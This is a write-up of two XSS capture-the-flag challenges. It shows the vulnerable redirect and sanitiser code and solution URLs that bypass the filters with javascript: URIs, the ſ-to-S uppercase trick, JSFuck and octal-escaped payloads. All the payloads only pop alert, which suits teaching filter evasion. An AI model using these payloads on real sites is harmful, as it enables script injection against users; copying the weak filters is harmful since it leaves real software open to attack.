# Simple XSS challenge by Penultimate - #0

## Challenge

https://penultimate.github.io/challenges/XSS/000000-xss

![image](https://user-images.githubusercontent.com/18099289/36552634-3972b758-17f2-11e8-8771-41b83cc5ffcc.png)

```js
var site = "https://penultimate.github.io";
var redirect = document.location + '';
redirect = redirect.split("redirect=")[1];
redirect = decodeURIComponent(redirect);
if (redirect.indexOf(site) > -1 && redirect.split("://")[1].split("/")[0] === site.split("://")[1].split("/")[0]) {
    location.href = redirect;
}
```

## Solutions

```
https://penultimate.github.io/challenges/XSS/000000-xss?redirect=javascript:alert`https://penultimate.github.io/`

https://penultimate.github.io/challenges/XSS/000000-xss?redirect=javascript:alert(1)//https://penultimate.github.io
```

```js
> site = "https://penultimate.github.io";
"https://penultimate.github.io"
> redirect = document.location + '';
"https://penultimate.github.io/challenges/XSS/000000-xss?redirect=javascript:alert`https://penultimate.github.io/`"
> redirect = redirect.split("redirect=")[1];
"javascript:alert`https://penultimate.github.io/`"
> redirect = decodeURIComponent(redirect);
"javascript:alert`https://penultimate.github.io/`"
> redirect.indexOf(site) > -1 && redirect.split("://")[1].split("/")[0]
"penultimate.github.io"
> site.split("://")[1].split("/")[0]
"penultimate.github.io"
> location.href = redirect;
"javascript:alert`https://penultimate.github.io/`"
```

The issue lies in the if statement `if (redirect.indexOf(site) > -1 && redirect.split("://")[1].split("/")[0] === site.split("://")[1].split("/")[0])`. The statement simply requires the redirect value to contain `https://penultimate.github.io` so we can execute `javascript:alert(1)` first, add the `https://penultimate.github.io` URL as a suffix, and comment out the URL using JavaScript's comment symbol `//`.

# Simple XSS challenge by Penultimate - #1

## Challenge

https://penultimate.github.io/challenges/XSS/000001-xss

![image](https://user-images.githubusercontent.com/18099289/36642338-0d094ca4-1a36-11e8-9921-6867bad9b129.png)

```js
function preventXSS(unsafe) {
    // Super secure XSS filter
    //            - Larry Lau
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/%/g, "ribbit")
        .replace(/alert/gi, "frog")
        .replace(/confirm/gi, "frog")
        .replace(/prompt/gi, "frog")
        .replace(/javascript/gi, "frog");
}
var url = document.location + '';
var param = url.split("param=")[1];
param = preventXSS(decodeURIComponent(param)).toUpperCase();
if (param !== 'UNDEFINED' && param !== "") {
    location.href = param;
}
```

## Solutions

To bypass the "javascript" keyword filter (`.replace(/javascript/gi, "frog");`), one can replace the "s" in javascript with `ſ`. The `.toUpperCase()` function neutralises the letter and outputs `S`.

```js
> "ſ".toUpperCase()
"S"
```

The next issue people faced was executing and `alert()` function after it had been passed to the `.toUpperCase()` function -- `ALERT()` is not a valid function. One way of achieving this was by using [JSFuck](http://www.jsfuck.com/), since uppercase `[]()!+` does not affect the code and you can execute the alert function using these symbols.

```
https://penultimate.github.io/challenges/XSS/000001-xss?param=javaſcript:[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()

https://penultimate.github.io/challenges/XSS/000001-xss?param=javas%09cript:[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

## Interesting and unexpected solutions

Baptiste MOINE ([@Creased_](https://twitter.com/Creased_)) and DrStache ([@DrStache_](https://twitter.com/DrStache_)) submitted interesting 90-character solutions.

```js
javaſcript:CSS['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164()')()

javaſcript:URL['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164()')()
```

[@filedescriptor](https://twitter.com/filedescriptor) submitted the following 89-character solution (Please note, this can be made shorter):

```js
javaſcript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

DrStache ([@DrStache_](https://twitter.com/DrStache_)) also submitted an beautiful solution where they used variables to reduce the size of the JSFuck payload.

```js
javaſcript:Ð=[],Ř=+!+Ð,ˍ=Ř+Ř+Ř,Š=!!Ð+Ð,Ť=!Ð+Ð,Ǎ=(!Ð+{})[Ř+[+Ð]],Č=(Ð+{})[Ř],Ȟ=Š[Ř],Ě=Š[+Ð],_=Ť[ˍ]+Č+Ȟ+Ě,ǰ=Ð[_]+Ð,š=Ð[Ð]+Ð,Ð[_][Ǎ+Č+(š)[Ř]+Ť[ˍ]+Ě+Ȟ+(š)[+Ð]+Ǎ+Ě+Č+Ȟ](Ť[Ř]+Ť[Ř+Ř]+Š[ˍ]+Ȟ+Ě+ǰ[Ř+[ˍ]]+ǰ[Ř+[ˍ+Ř]])()
```

[@z33_5h4n](https://twitter.com/z33_5h4n) used [katakana.js](https://github.com/aemkei/katakana.js).

```js
javascrıpt:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```
